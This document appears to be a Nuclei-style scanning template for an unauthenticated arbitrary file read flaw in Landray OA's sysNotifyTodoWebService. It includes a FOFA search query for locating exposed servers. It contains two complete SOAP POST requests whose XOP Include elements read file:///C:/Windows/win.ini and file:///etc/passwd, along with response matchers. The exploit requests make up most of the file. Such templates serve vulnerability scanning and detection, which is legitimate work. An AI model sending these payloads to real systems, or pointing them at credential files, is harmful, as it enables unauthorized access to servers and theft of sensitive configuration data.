id: Landray-WebService-sysNotifyTodoWebService-File-reading

info:
  name: 蓝凌OA WebService sysNotifyTodoWebService 接口任意文件读取漏洞
  author: Unknown
  severity: high
  description: |-
    fofa: body="Com_Parameter"
    蓝凌OA WebService 模块的 sysNotifyTodoWebService 接口存在任意文件读取缺陷。攻击者无需身份验证即可通过构造恶意请求访问受限文件系统资源，包括数据库连接配置文件、系统敏感配置文件等关键数据，可能引发信息泄露风险并为后续攻击提供入口。
  reference:
  - https://mp.weixin.qq.com/s/TbOAkXt_rWkmtyBubLHlJQ?token=1066715859&lang=zh_CN
  tags: 蓝凌OA


http:
- raw:
  - |
    POST /sys/webservice/sysNotifyTodoWebService HTTP/1.1
    Host: {{Hostname}}
    User-Agent: Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.3319.102 Safari/537.36
    Connection: close
    Content-Type: multipart/related; boundary=----4upt9dwdca8rtwq9osuz
    SOAPAction: ""
    Accept-Encoding: gzip, deflate

    ------4upt9dwdca8rtwq9osuz
    Content-Disposition: form-data; name="a"

    <soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:web="http://webservice.notify.sys.kmss.landray.com/">
    <soapenv:Header/>
    <soapenv:Body>
        <web:getTodoCount>
            <arg0>
                <beginTimeStamp>a</beginTimeStamp>
                <count><xop:Include xmlns:xop="http://www.w3.org/2004/08/xop/include" href="file:///C:/Windows/win.ini"/></count>
            </arg0>
        </web:getTodoCount>
    </soapenv:Body>
    </soapenv:Envelope>
    ------4upt9dwdca8rtwq9osuz--
  matchers-condition: and
  matchers:
  - type: word
    part: body
    words:
    - 'OyBmb3IgMTYtYml0IGFwcCBzdXBwb3J0'
    - 'Unmarshalling Error: 意外的文本'
    condition: and
  - type: status
    status:
    - 500
- raw:
  - |
    POST /sys/webservice/sysNotifyTodoWebService HTTP/1.1
    Host: {{Hostname}}
    User-Agent: Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.3319.102 Safari/537.36
    Connection: close
    Content-Type: multipart/related; boundary=----4upt9dwdca8rtwq9osuz
    SOAPAction: ""
    Accept-Encoding: gzip, deflate

    ------4upt9dwdca8rtwq9osuz
    Content-Disposition: form-data; name="a"

    <soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:web="http://webservice.notify.sys.kmss.landray.com/">
    <soapenv:Header/>
    <soapenv:Body>
        <web:getTodoCount>
            <arg0>
                <beginTimeStamp>a</beginTimeStamp>
                <count><xop:Include xmlns:xop="http://www.w3.org/2004/08/xop/include" href="file:///etc/passwd"/></count>
            </arg0>
        </web:getTodoCount>
    </soapenv:Body>
    </soapenv:Envelope>
    ------4upt9dwdca8rtwq9osuz--
  matchers-condition: and
  matchers:
  - type: word
    part: body
    words:
    - 'cm9vdDov'
    - 'L2Jpbi9iYXNo'
    - 'Unmarshalling Error: 意外的文本'
    condition: and
  - type: status
    status:
    - 500

